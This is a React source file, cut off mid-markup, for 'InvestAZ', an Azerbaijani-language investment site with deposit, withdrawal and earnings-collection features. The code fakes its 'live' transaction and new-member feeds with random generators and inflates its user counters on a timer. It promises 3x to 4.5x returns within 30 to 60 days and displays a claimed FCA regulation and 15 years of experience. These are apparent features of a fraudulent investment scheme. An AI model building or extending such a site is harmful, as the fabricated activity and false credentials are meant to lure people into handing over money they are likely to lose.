import React, { useState, useEffect } from 'react';
import { Button } from './ui/button';
import { Card } from './ui/card';
import { Input } from './ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from './ui/dialog';
import { Badge } from './ui/badge';
import { Alert, AlertDescription } from './ui/alert';
import { 
  generateRandomTransaction, 
  generateMembershipActivity,
  initialStats,
  companyInfo,
  formatAmount
} from '../mock';
import { ArrowUp, TrendingUp, Users, Activity, DollarSign, Eye, EyeOff, Building, Award, Shield, Globe, CreditCard, Upload, Package, Clock, CheckCircle, MoreVertical, ShoppingCart, Gift, AlertTriangle, Sparkles, MessageCircle, Bell, Timer } from 'lucide-react';
import axios from 'axios';

const API_BASE_URL = process.env.REACT_APP_BACKEND_URL;

const InvestmentPlatform = () => {
  // State management
  const [transactions, setTransactions] = useState([]);
  const [membershipActivities, setMembershipActivities] = useState([]);
  const [stats, setStats] = useState(initialStats);
  const [loginOpen, setLoginOpen] = useState(false);
  const [registerOpen, setRegisterOpen] = useState(false);
  const [withdrawOpen, setWithdrawOpen] = useState(false);
  const [depositOpen, setDepositOpen] = useState(false);
  const [packageConfirmOpen, setPackageConfirmOpen] = useState(false);
  const [pendingOpen, setPendingOpen] = useState(false);
  const [supportOpen, setSupportOpen] = useState(false);  
  const [notificationsOpen, setNotificationsOpen] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [selectedPackage, setSelectedPackage] = useState(null);
  const [selectedAmount, setSelectedAmount] = useState(0);
  const [expectedProfit, setExpectedProfit] = useState(0);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showBalances, setShowBalances] = useState(true);
  const [user, setUser] = useState(null);
  const [userPackages, setUserPackages] = useState([]);
  const [pendingTransactions, setPendingTransactions] = useState([]);
  const [token, setToken] = useState(localStorage.getItem('token'));
  const [packages, setPackages] = useState([]);
  const [messages, setMessages] = useState([]);
  const [notifications, setNotifications] = useState([]);
  const [websocket, setWebsocket] = useState(null);
  const [collectionStatus, setCollectionStatus] = useState({});
  const [countdownTimers, setCountdownTimers] = useState({});

  // Package definitions
  const packageDefinitions = {
    platinum: { name: 'Platinum Paket', minAmount: 50, maxAmount: 2500, multiplier: 3, duration: 30, color: '#C0C0C0', icon: '💎' },
    titanium: { name: 'Titanium Paket', minAmount: 50, maxAmount: 2500, multiplier: 4, duration: 45, color: '#434B52', icon: '🛡️' },
    gold: { name: 'Gold Paket', minAmount: 50, maxAmount: 2500, multiplier: 4.5, duration: 60, color: '#FFD700', icon: '👑' }
  };

  useEffect(() => {
    if (token) {
      setIsLoggedIn(true);
      fetchUserData();
      fetchUserPackages();
      fetchUserTransactions();
      fetchUserMessages();
      setupWebSocket();
    }
  }, [token]);

  // Auto-refresh data every 10 seconds when logged in
  useEffect(() => {
    if (isLoggedIn && token) {
      const interval = setInterval(() => {
        fetchUserData();
        fetchUserPackages();
        fetchUserTransactions();
        fetchUserMessages();
      }, 10000); // 10 seconds
      
      return () => clearInterval(interval);
    }
  }, [isLoggedIn, token]);

  // Setup WebSocket for real-time updates
  const setupWebSocket = () => {
    if (!user?.id) return;
    
    const wsUrl = `${API_BASE_URL.replace('https://', 'wss://').replace('http://', 'ws://')}/ws/user/${user.id}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        handleWebSocketMessage(data);
      } catch (e) {
        console.log('WebSocket message:', event.data);
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error:', error);
    };
    
    ws.onclose = () => {
      // Reconnect after 5 seconds
      setTimeout(() => setupWebSocket(), 5000);
    };
    
    setWebsocket(ws);
    
    return () => {
      if (ws) ws.close();
    };
  };

  const handleWebSocketMessage = (data) => {
    switch (data.type) {
      case 'balance_update':
      case 'admin_balance_update':
      case 'deposit_approved':
      case 'withdrawal_rejected':
        setUser(prev => ({ ...prev, balance: data.new_balance }));
        if (data.type === 'deposit_approved') {
          alert(`✅ Depozitiniz təsdiqləndi! ${formatAmount(data.amount)} AZN balansınıza əlavə edildi.`);
        } else if (data.type === 'withdrawal_rejected') {
          alert(`❌ Çıxarış təsdiq edilmədi: ${data.reason}. Məbləğ geri qaytarıldı.`);
        } else if (data.type === 'admin_balance_update') {
          alert(`💰 Admin tərəfindən balansınız yeniləndi: ${formatAmount(data.new_balance)} AZN`);
        }
        break;
      case 'withdrawal_approved':
        alert(`✅ Çıxarışınız təsdiqləndi! ${formatAmount(data.amount)} AZN ödəniş işlənir.`);
        break;
      case 'earnings_update':
        setUserPackages(prev => prev.map(pkg => 
          pkg.id === data.package_id 
            ? { ...pkg, accumulated_earnings: data.accumulated_earnings }
            : pkg
        ));
        break;
      case 'earnings_collected':
        setUser(prev => ({ ...prev, balance: data.new_balance }));
        if (data.next_collection_time) {
          startCountdownTimer(data.package_id, data.next_collection_time);
        }
        break;
      case 'admin_reply':
        fetchUserMessages();
        alert('📧 Dəstək komandası cavab göndərdi!');
        break;
    }
  };

  // Countdown timer for collection cooldown
  const startCountdownTimer = (packageId, nextCollectionTime) => {
    const endTime = new Date(nextCollectionTime).getTime();
    
    const updateTimer = () => {
      const now = Date.now();
      const timeLeft = Math.max(0, endTime - now);
      
      if (timeLeft <= 0) {
        setCountdownTimers(prev => {
          const newTimers = { ...prev };
          delete newTimers[packageId];
          return newTimers;
        });
        fetchCollectionStatus(packageId);
        return;
      }
      
      const minutes = Math.floor(timeLeft / (1000 * 60));
      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
      
      setCountdownTimers(prev => ({
        ...prev,
        [packageId]: { minutes, seconds, timeLeft }
      }));
    };
    
    updateTimer();
    const interval = setInterval(updateTimer, 1000);
    
    setTimeout(() => {
      clearInterval(interval);
    }, endTime - Date.now());
  };

  // Fetch collection status for packages
  const fetchCollectionStatus = async (packageId) => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/packages/${packageId}/collection-status`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      setCollectionStatus(prev => ({
        ...prev,
        [packageId]: response.data
      }));
      
      if (!response.data.can_collect && response.data.cooldown_remaining_seconds > 0) {
        // Start countdown if in cooldown
        const nextTime = new Date(Date.now() + response.data.cooldown_remaining_seconds * 1000);
        startCountdownTimer(packageId, nextTime.toISOString());
      }
    } catch (error) {
      console.error('Error fetching collection status:', error);
    }
  };

  // Check collection status for all user packages
  useEffect(() => {
    if (userPackages.length > 0) {
      userPackages.forEach(pkg => {
        fetchCollectionStatus(pkg.id);
      });
    }
  }, [userPackages]);

  // Live transaction feed
  useEffect(() => {
    const interval = setInterval(() => {
      const newTransaction = generateRandomTransaction();
      setTransactions(prev => [newTransaction, ...prev.slice(0, 29)]);
    }, 1200 + Math.random() * 800);
    return () => clearInterval(interval);
  }, []);

  // Live membership activities
  useEffect(() => {
    const interval = setInterval(() => {
      const newMember = generateMembershipActivity();
      setMembershipActivities(prev => [newMember, ...prev.slice(0, 9)]);
    }, 2500 + Math.random() * 1500);
    return () => clearInterval(interval);
  }, []);

  // User counter increment
  useEffect(() => {
    const interval = setInterval(() => {
      setStats(prev => ({
        ...prev,
        totalUsers: prev.totalUsers + Math.floor(Math.random() * 6) + 1,
        activeUsers: prev.activeUsers + Math.floor(Math.random() * 3),
        dailyTransactions: prev.dailyTransactions + Math.floor(Math.random() * 5) + 1,
        newMembers: prev.newMembers + Math.floor(Math.random() * 2) + 1
      }));
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  // API Functions
  const fetchUserData = async () => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/auth/me`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setUser(response.data);
    } catch (error) {
      console.error('Error fetching user data:', error);
      if (error.response?.status === 401) {
        handleLogout();
      }
    }
  };

  const fetchUserPackages = async () => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/packages/my`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setUserPackages(response.data.filter(pkg => pkg.is_active));
    } catch (error) {
      console.error('Error fetching packages:', error);
    }
  };

  const fetchUserTransactions = async () => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/transactions/my`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setPendingTransactions(response.data.filter(txn => txn.status === 'pending'));
    } catch (error) {
      console.error('Error fetching transactions:', error);
    }
  };

  const fetchUserMessages = async () => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/messages/my`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      setMessages(response.data);
    } catch (error) {
      console.error('Error fetching messages:', error);
    }
  };

  const handleLogin = async (email, password) => {
    try {
      const response = await axios.post(`${API_BASE_URL}/api/auth/login`, {
        email,
        password
      });
      
      const { access_token } = response.data;
      localStorage.setItem('token', access_token);
      setToken(access_token);
      setIsLoggedIn(true);
      setLoginOpen(false);
      
      // Fetch user data
      setTimeout(() => {
        fetchUserData();
        fetchUserPackages();
        fetchUserTransactions();
        fetchUserMessages();
      }, 100);
      
    } catch (error) {
      alert('❌ Email və ya şifrə yanlışdır.');
    }
  };

  const handleRegister = async (email, password, name) => {
    try {
      const response = await axios.post(`${API_BASE_URL}/api/auth/register`, {
        email,
        password,
        name
      });
      
      const { access_token } = response.data;
      localStorage.setItem('token', access_token);
      setToken(access_token);
      setIsLoggedIn(true);
      setRegisterOpen(false);
      
      // Show welcome bonus
      alert('🎉 Qeydiyyat bonusu: 10 AZN hesabınıza əlavə edildi!');
      
      // Fetch user data
      setTimeout(() => {
        fetchUserData();
        fetchUserPackages();
        fetchUserTransactions();
        fetchUserMessages();
      }, 100);
      
    } catch (error) {
      alert('❌ Qeydiyyat zamanı xəta baş verdi. Bu email artıq mövcuddur.');
    }
  };

  const handleLogout = () => {
    if (websocket) {
      websocket.close();
    }
    localStorage.removeItem('token');
    setToken(null);
    setIsLoggedIn(false);
    setUser(null);
    setUserPackages([]);
    setPendingTransactions([]);
    setMessages([]);
    setCollectionStatus({});
    setCountdownTimers({});
    setMenuOpen(false);
  };

  const handlePackageSelection = (packageType, amount) => {
    const pkg = packageDefinitions[packageType];
    if (amount < pkg.minAmount || amount > pkg.maxAmount) {
      alert(`❌ Bu paket üçün ${pkg.minAmount}-${pkg.maxAmount} AZN arası məbləğ daxil edin.`);
      return;
    }
    
    setSelectedPackage(packageType);
    setSelectedAmount(amount);
    setExpectedProfit(amount * pkg.multiplier);
    setPackageConfirmOpen(true);
  };

  const confirmPackagePurchase = async () => {
    try {
      await axios.post(`${API_BASE_URL}/api/packages/purchase`, {
        package_type: selectedPackage,
        invested_amount: selectedAmount
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      alert('🎉 Paket uğurla alındı! Gəliriniz toplanmağa başladı.');
      setPackageConfirmOpen(false);
      
      // Refresh data
      fetchUserData();
      fetchUserPackages();
      
    } catch (error) {
      alert('❌ ' + (error.response?.data?.detail || 'Paket alınırken xəta baş verdi.'));
    }
  };

  const handleWithdraw = async (amount, cardName, cardNumber) => {
    try {
      await axios.post(`${API_BASE_URL}/api/transactions`, {
        type: 'withdraw',
        amount: parseFloat(amount),
        card_name: cardName,
        card_number: cardNumber
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      alert('🎉 Çıxarış sorğunuz göndərildi. Admin təsdiqi gözlənilir.');
      setWithdrawOpen(false);
      fetchUserData();
      fetchUserTransactions();
      
    } catch (error) {
      alert('❌ ' + (error.response?.data?.detail || 'Çıxarış zamanı xəta baş verdi.'));
    }
  };

  const handleDeposit = async (amount, cardNumber, receipt) => {
    try {
      const response = await axios.post(`${API_BASE_URL}/api/transactions`, {
        type: 'deposit',
        amount: parseFloat(amount),
        card_number: cardNumber
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      // Upload receipt if provided
      if (receipt) {
        const formData = new FormData();
        formData.append('file', receipt);
        
        await axios.post(`${API_BASE_URL}/api/transactions/${response.data.id}/upload-receipt`, formData, {
          headers: { 
            Authorization: `Bearer ${token}`,
            'Content-Type': 'multipart/form-data'
          }
        });
      }
      
      alert('🎉 Depozit sorğunuz göndərildi. Admin təsdiqi gözlənilir.');
      setDepositOpen(false);
      fetchUserTransactions();
      
    } catch (error) {
      alert('❌ ' + (error.response?.data?.detail || 'Depozit zamanı xəta baş verdi.'));
    }
  };

  const collectEarnings = async (packageId) => {
    try {
      const response = await axios.post(`${API_BASE_URL}/api/packages/${packageId}/collect`, {}, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      alert(`🎉 ${formatAmount(response.data.collected_amount)} AZN balansınıza əlavə edildi!`);
      
      // Start countdown timer for next collection
      if (response.data.next_collection_time) {
        startCountdownTimer(packageId, response.data.next_collection_time);
      }
      
      fetchUserData();
      fetchUserPackages();
      
    } catch (error) {
      const errorMessage = error.response?.data?.detail || 'Qazanc toplanırken xəta baş verdi.';
      if (errorMessage.includes('Cooldown active')) {
        alert(`⏰ ${errorMessage}`);
      } else {
        alert('❌ ' + errorMessage);
      }
    }
  };

  const sendSupportMessage = async (message) => {
    try {
      await axios.post(`${API_BASE_URL}/api/messages`, {
        content: message,
        message_type: 'support'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      alert('✅ Mesajınız adminə göndərildi.');
      setSupportOpen(false);
      fetchUserMessages();
      
    } catch (error) {
      alert('❌ Mesaj göndərilmədi.');
    }
  };

  // Utility functions
  const blurName = (name) => {
    const parts = name.split(' ');
    if (parts.length >= 2) {
      return `${parts[0].charAt(0)}*** ${parts[1]}`;
    }
    return `${name.charAt(0)}***`;
  };

  const hasActivePackage = userPackages.length > 0;

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-black/90 backdrop-blur-sm sticky top-0 z-40">
        <div className="container mx-auto px-4 sm:px-6 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2 sm:space-x-4">
            <div className="text-xl sm:text-2xl font-bold text-yellow-400">InvestAZ</div>
            <Badge className="bg-green-600 text-white animate-pulse text-xs">Canlı</Badge>
          </div>
          
          <div className="flex items-center space-x-2 sm:space-x-4">
            {!isLoggedIn ? (
              <>
                <Dialog open={loginOpen} onOpenChange={setLoginOpen}>
                  <DialogTrigger asChild>
                    <Button variant="outline" size="sm" className="border-yellow-400 text-yellow-400 hover:bg-yellow-400 hover:text-black text-xs sm:text-sm">
                      Giriş
                    </Button>
                  </DialogTrigger>
                  <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-sm">
                    <DialogHeader>
                      <DialogTitle className="text-white">Hesaba Giriş</DialogTitle>
                    </DialogHeader>
                    <LoginForm onLogin={handleLogin} />
                  </DialogContent>
                </Dialog>

                <Dialog open={registerOpen} onOpenChange={setRegisterOpen}>
                  <DialogTrigger asChild>
                    <Button size="sm" className="bg-yellow-400 text-black hover:bg-yellow-500 text-xs sm:text-sm">
                      Qeydiyyat
                    </Button>
                  </DialogTrigger>
                  <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-sm">
                    <DialogHeader>
                      <DialogTitle className="text-white">Yeni Hesab Yaradın</DialogTitle>
                    </DialogHeader>
                    <RegisterForm onRegister={handleRegister} />
                  </DialogContent>
                </Dialog>
              </>
            ) : (
              <div className="flex items-center space-x-2 sm:space-x-4">
                <div className="flex items-center space-x-2 sm:space-x-4">
                  <div className="text-xs sm:text-sm">
                    <div className="text-gray-400 hidden sm:block">Xoş gəlmisiniz</div>
                    <div className="font-bold text-white">
                      {hasActivePackage ? (
                        <span className="inline-flex items-center px-3 py-1 rounded-full bg-yellow-400 text-black font-bold">
                          {user?.name}
                        </span>
                      ) : (
                        user?.name
                      )}
                    </div>
                    {hasActivePackage && userPackages[0] && (
                      <div className="flex items-center text-yellow-400 text-xs mt-1">
                        <span className="mr-1">{packageDefinitions[userPackages[0].package_type]?.icon}</span>
                        {packageDefinitions[userPackages[0].package_type]?.name}
                      </div>
                    )}
                  </div>
                  <div className="text-xs sm:text-sm">
                    <div className="text-gray-400">Balans</div>
                    <div className="font-bold text-yellow-400">{formatAmount(user?.balance || 0)} AZN</div>
                    {user?.user_code && (
                      <div className="text-xs text-gray-500">Kod: {user.user_code}</div>
                    )}
                  </div>
                </div>

                {/* Mobile Menu */}
                <div className="relative">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setMenuOpen(!menuOpen)}
                    className="border-gray-600 text-gray-400 hover:text-white p-2"
                  >
                    <MoreVertical className="w-4 h-4" />
                  </Button>

                  {menuOpen && (
                    <div className="absolute right-0 top-12 bg-gray-800 border border-gray-700 rounded-lg shadow-lg py-2 w-56 z-50">
                      <div className="px-4 py-2 border-b border-gray-700">
                        <div className="text-xs text-gray-400">İstifadəçi Kodu</div>
                        <div className="text-sm text-yellow-400 font-bold">{user?.user_code}</div>
                      </div>
                      
                      <button
                        onClick={() => {
                          setSupportOpen(true);
                          setMenuOpen(false);
                        }}
                        className="w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700 flex items-center"
                      >
                        <MessageCircle className="w-4 h-4 mr-2" />
                        Dəstək
                      </button>
                      
                      <button
                        onClick={() => {
                          setNotificationsOpen(true);
                          setMenuOpen(false);
                        }}
                        className="w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700 flex items-center justify-between"
                      >
                        <span className="flex items-center">
                          <Bell className="w-4 h-4 mr-2" />
                          Bildirişlər
                        </span>
                        {(pendingTransactions.length > 0 || messages.filter(m => !m.is_read).length > 0) && (
                          <Badge className="bg-red-600 text-white text-xs">
                            {pendingTransactions.length + messages.filter(m => !m.is_read).length}
                          </Badge>
                        )}
                      </button>
                      
                      <button
                        onClick={() => {
                          setPendingOpen(true);
                          setMenuOpen(false);
                        }}
                        className="w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700 flex items-center justify-between"
                      >
                        <span className="flex items-center">
                          <Clock className="w-4 h-4 mr-2" />
                          Gözləyən Əməliyyatlar
                        </span>
                        {pendingTransactions.length > 0 && (
                          <Badge className="bg-yellow-600 text-white text-xs">
                            {pendingTransactions.length}
                          </Badge>
                        )}
                      </button>
                      
                      <button
                        onClick={() => {
                          setWithdrawOpen(true);
                          setMenuOpen(false);
                        }}
                        className="w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700 flex items-center"
                      >
                        <CreditCard className="w-4 h-4 mr-2" />
                        Çıxarış Et
                      </button>

                      <button
                        onClick={() => {
                          setDepositOpen(true);
                          setMenuOpen(false);
                        }}
                        className="w-full text-left px-4 py-2 text-sm text-white hover:bg-gray-700 flex items-center"
                      >
                        <DollarSign className="w-4 h-4 mr-2" />
                        Yatırım Et
                      </button>

                      <hr className="border-gray-700 my-1" />
                      
                      <button
                        onClick={handleLogout}
                        className="w-full text-left px-4 py-2 text-sm text-red-400 hover:bg-gray-700"
                      >
                        Çıxış
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 sm:px-6 py-4 sm:py-8">
        {!isLoggedIn ? (
          // Landing Page
          <div className="space-y-8 sm:space-y-12">
            {/* Hero Section */}
            <div className="text-center py-8 sm:py-16">
              <h1 className="text-4xl sm:text-6xl font-bold mb-4 sm:mb-6">
                <span className="text-white">Invest</span>
                <span className="text-yellow-400">AZ</span>
              </h1>
              <p className="text-lg sm:text-xl text-gray-300 mb-6 sm:mb-8 max-w-2xl mx-auto px-4">
                Azərbaycanın ən etibarlı investisiya platforması. 15 illik təcrübə ilə maliyyə azadlığınıza giden yol.
              </p>
              <div className="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4 px-4">
                <Button onClick={() => setRegisterOpen(true)} className="bg-yellow-400 text-black hover:bg-yellow-500 px-6 sm:px-8 py-3 text-base sm:text-lg w-full sm:w-auto">
                  <Sparkles className="w-5 h-5 mr-2" />
                  İndi Başla
                </Button>
                <Button variant="outline" onClick={() => setLoginOpen(true)} className="border-yellow-400 text-yellow-400 px-6 sm:px-8 py-3 text-base sm:text-lg w-full sm:w-auto">
                  Hesaba Giriş
                </Button>
              </div>
            </div>

            {/* Stats Section */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-8 sm:mb-12">
              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6 text-center">
                <div className="text-2xl sm:text-3xl font-bold text-yellow-400 count-up">
                  {stats.totalUsers.toLocaleString()}
                </div>
                <div className="text-gray-400 mt-2 text-xs sm:text-sm">Ümumi İstifadəçi</div>
                <div className="flex items-center justify-center text-green-400 mt-2">
                  <ArrowUp className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
                  <span className="text-xs sm:text-sm">Artır</span>
                </div>
              </Card>

              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6 text-center">
                <div className="text-2xl sm:text-3xl font-bold text-green-400 count-up">
                  {stats.activeUsers.toLocaleString()}
                </div>
                <div className="text-gray-400 mt-2 text-xs sm:text-sm">Aktiv İstifadəçi</div>
                <div className="flex items-center justify-center text-green-400 mt-2">
                  <ArrowUp className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
                  <span className="text-xs sm:text-sm">Artır</span>
                </div>
              </Card>

              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6 text-center">
                <div className="text-2xl sm:text-3xl font-bold text-blue-400 count-up">
                  {stats.dailyTransactions.toLocaleString()}
                </div>
                <div className="text-gray-400 mt-2 text-xs sm:text-sm">Gündəlik Əməliyyat</div>
                <div className="flex items-center justify-center text-green-400 mt-2">
                  <ArrowUp className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
                  <span className="text-xs sm:text-sm">Artır</span>
                </div>
              </Card>

              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6 text-center">
                <div className="text-2xl sm:text-3xl font-bold text-purple-400 count-up">
                  {stats.newMembers.toLocaleString()}
                </div>
                <div className="text-gray-400 mt-2 text-xs sm:text-sm">Yeni Üzvlər (Bu gün)</div>
                <div className="flex items-center justify-center text-green-400 mt-2">
                  <ArrowUp className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />
                  <span className="text-xs sm:text-sm">Artır</span>
                </div>
              </Card>
            </div>

            {/* Live Activities */}
            <div className="grid lg:grid-cols-2 gap-6 sm:gap-8">
              {/* Live Transactions */}
              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-base sm:text-lg font-bold text-yellow-400">Canlı Əməliyyatlar</h3>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                    <span className="text-xs text-green-400">CANLI</span>
                  </div>
                </div>

                <div className="space-y-3 max-h-60 sm:max-h-80 overflow-y-auto">
                  {transactions.map((txn) => (
                    <div key={txn.id} className="bg-gray-800 rounded-lg p-3 slide-up border-l-4 border-l-yellow-400">
                      <div className="flex justify-between items-start">
                        <div className="flex-1">
                          <div className="flex items-center space-x-2">
                            <span className="font-medium text-white text-xs sm:text-sm">
                              {showBalances ? txn.name : blurName(txn.name)}
                            </span>
                            <Badge className={`text-xs ${txn.type === 'deposit' ? 'bg-green-600' : 'bg-blue-600'}`}>
                              {txn.type === 'deposit' ? 'Yatırım' : 'Çıxarış'}
                            </Badge>
                          </div>
                          <div className="text-xs text-gray-400 mt-1">
                            {txn.bank}
                          </div>
                        </div>
                        <div className="text-right">
                          <div className={`font-bold text-xs sm:text-sm ${txn.type === 'deposit' ? 'text-green-400' : 'text-red-400'}`}>
                            {txn.type === 'deposit' ? '+' : '-'}{formatAmount(txn.amount)} AZN
                          </div>
                          <div className="text-xs text-gray-500">
                            {new Date(txn.timestamp).toLocaleTimeString()}
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>

              {/* Live Memberships */}
              <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-base sm:text-lg font-bold text-yellow-400">Yeni Üzvlər</h3>
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-purple-400 rounded-full animate-pulse"></div>
                    <span className="text-xs text-purple-400">CANLI</span>
                  </div>
                </div>

                <div className="space-y-3 max-h-60 sm:max-h-80 overflow-y-auto">
                  {membershipActivities.map((member) => (
                    <div key={member.id} className="bg-gray-800 rounded-lg p-3 slide-up border-l-4 border-l-purple-400">
                      <div className="flex justify-between items-center">
                        <div className="flex-1">
                          <div className="flex items-center space-x-2">
                            <Users className="w-3 h-3 sm:w-4 sm:h-4 text-purple-400" />
                            <span className="font-medium text-white text-xs sm:text-sm">
                              {showBalances ? member.name : blurName(member.name)}
                            </span>
                          </div>
                          <div className="text-xs text-gray-400 mt-1">
                            {member.action}
                          </div>
                        </div>
                        <div className="text-xs text-gray-500">
                          {new Date(member.timestamp).toLocaleTimeString()}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>
            </div>

            {/* Company Info */}
            <Card className="bg-gray-900 border-gray-800 p-6 sm:p-8">
              <h2 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-4 sm:mb-6 text-center">InvestAZ Haqqında</h2>
              <div className="grid md:grid-cols-2 gap-6 sm:gap-8">
                <div>
                  <div className="flex items-center space-x-3 mb-4">
                    <Globe className="w-5 h-5 sm:w-6 sm:h-6 text-yellow-400" />
                    <div>
                      <div className="font-bold text-white">{companyInfo.name}</div>
                      <div className="text-gray-400 text-sm">{companyInfo.country} şirkəti</div>
                    </div>
                  </div>
                  
                  <div className="flex items-center space-x-3 mb-4">
                    <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-green-400" />
                    <div>
                      <div className="font-bold text-white">Rəqəm: {companyInfo.license}</div>
                      <div className="text-gray-400 text-sm">FCA tərəfindən tənzimlənir</div>
                    </div>
                  </div>

                  <div className="flex items-center space-x-3">
                    <Building className="w-5 h-5 sm:w-6 sm:h-6 text-blue-400" />
                    <div>
                      <div className="font-bold text-white">{companyInfo.experience}</div>
                      <div className="text-gray-400 text-sm">{companyInfo.established}-cu ildən xidmətdə</div>
                    </div>
                  </div>
                </div>

                <div>
                  <h3 className="font-bold text-white mb-4 flex items-center">
                    <Award className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-400 mr-2" />
                    Uğurlarımız
                  </h3>
                  <ul className="space-y-2">
                    {companyInfo.achievements.map((achievement, index) => (
                      <li key={index} className="text-gray-300 text-sm">
                        • {achievement}
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
            </Card>
          </div>
        ) : (
          // Logged In Dashboard
          <div className="space-y-6 sm:space-y-8">
            <div className="text-center">
              <h1 className="text-3xl sm:text-4xl font-bold text-yellow-400 mb-4">
                Xoş gəlmisiniz, {user?.name}!
              </h1>
              {hasActivePackage ? (
                <div className="flex items-center justify-center space-x-2 mb-4">
                  <span className="text-2xl">{packageDefinitions[userPackages[0].package_type]?.icon}</span>
                  <span className="text-xl text-yellow-400">{packageDefinitions[userPackages[0].package_type]?.name}</span>
                </div>
              ) : (
                <p className="text-gray-300">İnvestisiya paketinizi seçin və qazanmağa başlayın</p>
              )}
            </div>

            {/* Show packages only if user doesn't have active package */}
            {!hasActivePackage && (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-yellow-400 text-center">İnvestisiya Paketləri</h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  {Object.entries(packageDefinitions).map(([key, pkg]) => (
                    <NewPackageCard 
                      key={key}
                      packageKey={key}
                      package={pkg}
                      onSelect={handlePackageSelection}
                      userBalance={user?.balance || 0}
                    />
                  ))}
                </div>
              </div>
            )}

            {/* Show active packages with 30-minute collection system */}
            {hasActivePackage && (
              <div className="space-y-6">
                <h2 className="text-2xl font-bold text-yellow-400 text-center">Aktiv Paketiniz</h2>
                <div className="grid gap-6">
                  {userPackages.map((userPkg, index) => {
                    const pkg = packageDefinitions[userPkg.package_type];
                    const totalEarnings = userPkg.invested_amount * pkg.multiplier;
                    const progressPercentage = ((userPkg.accumulated_earnings / (totalEarnings - userPkg.invested_amount)) * 100).toFixed(1);
                    const canCollect = collectionStatus[userPkg.id]?.can_collect ?? true;
                    const countdown = countdownTimers[userPkg.id];
                    
                    return (
                      <Card key={userPkg.id} className="bg-gradient-to-r from-gray-900 to-gray-800 border-yellow-400 p-6">
                        <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center">
                          <div className="flex items-center space-x-4 mb-4 lg:mb-0">
                            <div className="text-6xl animate-pulse" style={{ color: pkg.color }}>
                              {pkg.icon}
                            </div>
                            <div>
                              <h3 className="text-2xl font-bold text-white">{pkg.name}</h3>
                              <div className="text-sm text-gray-500 mt-1">
                                Başlama: {new Date(userPkg.start_date).toLocaleDateString()}
                              </div>
                              <div className="text-sm text-yellow-400 mt-1">
                                İnvestisiya: {formatAmount(userPkg.invested_amount)} AZN
                              </div>
                            </div>
                          </div>
                          
                          <div className="text-right w-full lg:w-auto">
                            <div className="bg-gray-800 rounded-lg p-4 mb-4">
                              <div className="text-sm text-gray-400">Şu ana qədər qazanc</div>
                              <div className="text-3xl font-bold text-green-400 animate-pulse">
                                {formatAmount(userPkg.accumulated_earnings || 0)} AZN
                              </div>
                              <div className="text-xs text-yellow-400 mt-2">
                                Proqres: {progressPercentage}%
                              </div>
                              {/* Progress bar */}
                              <div className="w-full bg-gray-700 rounded-full h-2 mt-2">
                                <div 
                                  className="bg-gradient-to-r from-green-400 to-yellow-400 h-2 rounded-full transition-all duration-500"
                                  style={{ width: `${Math.min(progressPercentage, 100)}%` }}
                                ></div>
                              </div>
                            </div>
                            
                            {/* Collection Button with Countdown */}
                            {canCollect ? (
                              <Button
                                onClick={() => collectEarnings(userPkg.id)}
                                disabled={(userPkg.accumulated_earnings || 0) < 0.01}
